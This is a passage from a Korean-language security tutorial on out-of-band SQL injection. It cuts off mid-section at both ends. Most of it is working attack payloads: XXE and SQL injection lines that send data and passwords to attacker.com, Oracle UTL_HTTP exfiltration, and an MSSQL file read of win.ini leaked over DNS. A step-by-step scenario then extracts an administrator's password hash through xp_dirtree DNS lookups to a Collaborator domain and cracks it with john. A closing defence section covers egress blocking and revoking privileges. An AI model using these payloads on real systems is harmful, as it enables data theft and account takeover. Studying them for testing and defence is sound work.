<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token prolog" style="color:#999988;font-style:italic">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token doctype punctuation" style="color:#393A34;font-style:italic">&lt;!</span><span class="token doctype doctype-tag" style="color:#999988;font-style:italic">DOCTYPE</span><span class="token doctype" style="color:#999988;font-style:italic"> </span><span class="token doctype name" style="color:#999988;font-style:italic">foo</span><span class="token doctype" style="color:#999988;font-style:italic"> </span><span class="token doctype punctuation" style="color:#393A34;font-style:italic">[</span><span class="token doctype internal-subset" style="color:#999988;font-style:italic"></span><br></span><span class="token-line" style="color:#393A34"><span class="token doctype internal-subset" style="color:#999988;font-style:italic">  &lt;!ENTITY xxe SYSTEM &quot;http://attacker.com/?data=ENTITY_DATA&quot;&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token doctype internal-subset" style="color:#999988;font-style:italic"></span><span class="token doctype punctuation" style="color:#393A34;font-style:italic">]</span><span class="token doctype punctuation" style="color:#393A34;font-style:italic">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">data</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token entity named-entity" style="color:#36acaa">&amp;xxe;</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">data</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<p><strong>SQL Injection으로 XML 생성</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; DECLARE @xml VARCHAR(MAX);</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">SET @xml=&#x27;</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">?xml version</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;1.0&quot;</span><span class="token plain">?</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">DOCTYPE foo </span><span class="token punctuation" style="color:#393A34">[</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">ENTITY xxe SYSTEM </span><span class="token string" style="color:#e3116c">&quot;http://attacker.com/?pass=&#x27;+(SELECT password FROM users WHERE id=1)+&#x27;&quot;</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">data</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">xxe</span><span class="token punctuation" style="color:#393A34">;</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token operator" style="color:#393A34">/</span><span class="token keyword" style="color:#00009f">data</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">EXEC</span><span class="token plain"> sp_xml_preparedocument </span><span class="token variable" style="color:#36acaa">@xml</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3-ssrf--oob">3. SSRF + OOB<a href="#3-ssrf--oob" class="hash-link" aria-label="Direct link to 3. SSRF + OOB" title="Direct link to 3. SSRF + OOB" translate="no">​</a></h3>
<p><strong>SSRF로 내부 서비스 스캔 + OOB로 결과 전송</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Oracle - 내부 서버 스캔 결과 전송</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27; AND UTL_HTTP.REQUEST(&#x27;</span><span class="token plain">http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?response=&#x27;||UTL_HTTP.REQUEST(&#x27;http://internal-server:8080/admin&#x27;))=&#x27;1&#x27;--</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4-파일-읽기--oob">4. 파일 읽기 + OOB<a href="#4-파일-읽기--oob" class="hash-link" aria-label="Direct link to 4. 파일 읽기 + OOB" title="Direct link to 4. 파일 읽기 + OOB" translate="no">​</a></h3>
<p><strong>파일 내용을 OOB로 전송</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># MSSQL - 파일 읽기 + DNS 전송</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; DECLARE @file VARCHAR(MAX);</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">SET @file=(SELECT BulkColumn FROM OPENROWSET(BULK &#x27;</span><span class="token plain">C:\Windows\win</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ini</span><span class="token string" style="color:#e3116c">&#x27;, SINGLE_CLOB) AS x);</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@file+&#x27;.attacker.com\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="실전-공격-시나리오">실전 공격 시나리오<a href="#실전-공격-시나리오" class="hash-link" aria-label="Direct link to 실전 공격 시나리오" title="Direct link to 실전 공격 시나리오" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="시나리오-완전-blind-환경에서-관리자-계정-탈취">시나리오: 완전 Blind 환경에서 관리자 계정 탈취<a href="#시나리오-완전-blind-환경에서-관리자-계정-탈취" class="hash-link" aria-label="Direct link to 시나리오: 완전 Blind 환경에서 관리자 계정 탈취" title="Direct link to 시나리오: 완전 Blind 환경에서 관리자 계정 탈취" translate="no">​</a></h3>
<p><strong>대상</strong>: 모든 입력에 동일한 응답을 반환하는 검색 기능</p>
<p><strong>환경</strong>:</p>
<ul>
<li>DBMS: MSSQL 2019</li>
<li>응답 차이: 없음 (Boolean-based 불가)</li>
<li>Time-based: SLEEP 함수 차단됨</li>
</ul>
<p><strong>공격 과정</strong>:</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="1-burp-collaborator-준비">1. Burp Collaborator 준비<a href="#1-burp-collaborator-준비" class="hash-link" aria-label="Direct link to 1. Burp Collaborator 준비" title="Direct link to 1. Burp Collaborator 준비" translate="no">​</a></h4>
<p>Burp Suite → Burp Collaborator client 열기</p>
<p>생성된 도메인:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">xyz987abc.burpcollaborator.net</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="2-oob-취약점-테스트">2. OOB 취약점 테스트<a href="#2-oob-취약점-테스트" class="hash-link" aria-label="Direct link to 2. OOB 취약점 테스트" title="Direct link to 2. OOB 취약점 테스트" translate="no">​</a></h4>
<p><strong>Burp Suite로 요청 캡처</strong>:</p>
<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-http codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">GET /search?q=laptop HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host: example.com</span><br></span></code></pre></div></div>
<p><strong>페이로드 주입</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/search?q=laptop&#x27;; EXEC xp_dirtree &#x27;\\xyz987abc.burpcollaborator.net\test&#x27;--</span><br></span></code></pre></div></div>
<p><strong>Burp Collaborator 확인</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DNS query received: xyz987abc.burpcollaborator.net</span><br></span></code></pre></div></div>
<p>→ <strong>OOB SQLi 취약점 확인</strong></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="3-데이터베이스-정보-수집">3. 데이터베이스 정보 수집<a href="#3-데이터베이스-정보-수집" class="hash-link" aria-label="Direct link to 3. 데이터베이스 정보 수집" title="Direct link to 3. 데이터베이스 정보 수집" translate="no">​</a></h4>
<p><strong>DB 이름</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; DECLARE @db VARCHAR(100); SET @db=(SELECT DB_NAME()); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@db+&#x27;.xyz987abc.burpcollaborator.net\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>Burp Collaborator</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">corpdb.xyz987abc.burpcollaborator.net</span><br></span></code></pre></div></div>
<p><strong>테이블 목록 (1번째)</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; DECLARE @tbl VARCHAR(100); SET @tbl=(SELECT TOP 1 name FROM sys.tables ORDER BY name); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@tbl+&#x27;.xyz987abc.burpcollaborator.net\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>결과</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">employees.xyz987abc.burpcollaborator.net</span><br></span></code></pre></div></div>
<p><strong>테이블 목록 (2번째)</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; DECLARE @tbl VARCHAR(100); SET @tbl=(SELECT TOP 1 name FROM sys.tables WHERE name NOT IN (&#x27;</span><span class="token plain">employees</span><span class="token string" style="color:#e3116c">&#x27;) ORDER BY name); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@tbl+&#x27;.xyz987abc.burpcollaborator.net\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>결과</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">users.xyz987abc.burpcollaborator.net</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="4-관리자-비밀번호-추출">4. 관리자 비밀번호 추출<a href="#4-관리자-비밀번호-추출" class="hash-link" aria-label="Direct link to 4. 관리자 비밀번호 추출" title="Direct link to 4. 관리자 비밀번호 추출" translate="no">​</a></h4>
<p><strong>관리자 계정 확인</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; DECLARE @user VARCHAR(100); SET @user=(SELECT TOP 1 username FROM users WHERE role=&#x27;</span><span class="token plain">admin</span><span class="token string" style="color:#e3116c">&#x27;); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@user+&#x27;.xyz987abc.burpcollaborator.net\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>결과</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">administrator.xyz987abc.burpcollaborator.net</span><br></span></code></pre></div></div>
<p><strong>비밀번호 해시 추출 (1-30글자)</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; DECLARE @pass VARCHAR(30); SET @pass=(SELECT SUBSTRING(password, 1, 30) FROM users WHERE username=&#x27;</span><span class="token plain">administrator</span><span class="token string" style="color:#e3116c">&#x27;); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@pass+&#x27;.1.xyz987abc.burpcollaborator.net\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>결과</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">5f4dcc3b5aa765d61d8327deb882.1.xyz987abc.burpcollaborator.net</span><br></span></code></pre></div></div>
<p><strong>비밀번호 해시 추출 (31-60글자)</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; DECLARE @pass VARCHAR(30); SET @pass=(SELECT SUBSTRING(password, 31, 30) FROM users WHERE username=&#x27;</span><span class="token plain">administrator</span><span class="token string" style="color:#e3116c">&#x27;); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@pass+&#x27;.2.xyz987abc.burpcollaborator.net\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>결과</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cf99.2.xyz987abc.burpcollaborator.net</span><br></span></code></pre></div></div>
<p><strong>합치기</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">5f4dcc3b5aa765d61d8327deb882cf99</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="5-해시-크랙">5. 해시 크랙<a href="#5-해시-크랙" class="hash-link" aria-label="Direct link to 5. 해시 크랙" title="Direct link to 5. 해시 크랙" translate="no">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &quot;5f4dcc3b5aa765d61d8327deb882cf99&quot; &gt; hash.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></span></code></pre></div></div>
<p><strong>결과</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">password         (?)</span><br></span></code></pre></div></div>
<p><strong>로그인 성공</strong>:</p>
<ul>
<li>Username: <code>administrator</code></li>
<li>Password: <code>password</code></li>
</ul>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="방어-기법">방어 기법<a href="#방어-기법" class="hash-link" aria-label="Direct link to 방어 기법" title="Direct link to 방어 기법" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1-네트워크-레벨-차단">1. 네트워크 레벨 차단<a href="#1-네트워크-레벨-차단" class="hash-link" aria-label="Direct link to 1. 네트워크 레벨 차단" title="Direct link to 1. 네트워크 레벨 차단" translate="no">​</a></h3>
<p><strong>방화벽 규칙 - DB 서버 아웃바운드 차단</strong>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># iptables - 외부 통신 차단</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -A OUTPUT -p tcp --dport 80 -j DROP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -A OUTPUT -p tcp --dport 443 -j DROP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -A OUTPUT -p udp --dport 53 -j DROP</span><br></span></code></pre></div></div>
<p><strong>예외 추가</strong> (필요한 경우):</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 특정 IP만 허용</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -A OUTPUT -d 192.168.1.100 -j ACCEPT</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2-dbms-권한-제한">2. DBMS 권한 제한<a href="#2-dbms-권한-제한" class="hash-link" aria-label="Direct link to 2. DBMS 권한 제한" title="Direct link to 2. DBMS 권한 제한" translate="no">​</a></h3>
<p><strong>MSSQL - xp_dirtree 비활성화</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">EXEC</span><span class="token plain"> sp_dropextendedproc </span><span class="token string" style="color:#e3116c">&#x27;xp_dirtree&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">EXEC</span><span class="token plain"> sp_dropextendedproc </span><span class="token string" style="color:#e3116c">&#x27;xp_fileexist&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">EXEC</span><span class="token plain"> sp_dropextendedproc </span><span class="token string" style="color:#e3116c">&#x27;xp_subdirs&#x27;</span><br></span></code></pre></div></div>
<p><strong>Oracle - UTL_HTTP 권한 제거</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">REVOKE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">EXECUTE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ON</span><span class="token plain"> UTL_HTTP </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">PUBLIC</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">REVOKE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">EXECUTE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ON</span><span class="token plain"> UTL_INADDR </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">PUBLIC</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">REVOKE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">EXECUTE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ON</span><span class="token plain"> DBMS_LDAP </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">PUBLIC</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><strong>PostgreSQL - COPY 권한 제거</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">REVOKE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">EXECUTE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ON</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FUNCTION</span><span class="token plain"> pg_read_file </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">PUBLIC</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">REVOKE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">EXECUTE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ON</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FUNCTION</span><span class="token plain"> pg_read_binary_file </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">PUBLIC</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3-dns-싱크홀-dns-sinkhole">3. DNS 싱크홀 (DNS Sinkhole)<a href="#3-dns-싱크홀-dns-sinkhole" class="hash-link" aria-label="Direct link to 3. DNS 싱크홀 (DNS Sinkhole)" title="Direct link to 3. DNS 싱크홀 (DNS Sinkhole)" translate="no">​</a></h3>
<p><strong>내부 DNS 서버에서 외부 조회 차단</strong>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># BIND 설정 예시</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">zone &quot;.&quot; {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    type master;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    file &quot;/etc/bind/blocked.zone&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">};</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4-애플리케이션-레벨-방어">4. 애플리케이션 레벨 방어<a href="#4-애플리케이션-레벨-방어" class="hash-link" aria-label="Direct link to 4. 애플리케이션 레벨 방어" title="Direct link to 4. 애플리케이션 레벨 방어" translate="no">​</a></h3>
<p><strong>Prepared Statements</strong>:</p>
